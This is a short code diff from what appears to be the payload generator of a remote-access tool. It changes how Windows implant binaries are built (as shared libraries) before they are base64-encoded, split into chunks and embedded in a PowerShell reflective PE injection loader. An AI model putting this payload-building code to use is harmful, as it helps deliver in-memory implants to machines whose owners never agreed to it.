@@ -518,8 +518,8 @@ def pupygen(args, config):
         }}
         Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
         """#{1}=x86dll, {3}=x64dll
-        binaryX64 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x64')[0])
-        binaryX86 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x86')[0])
+        binaryX64 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x64', shared=True)[0])
+        binaryX86 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x86', shared=True)[0])
         binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
         binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
         for i,aPart in enumerate(binaryX86parts):
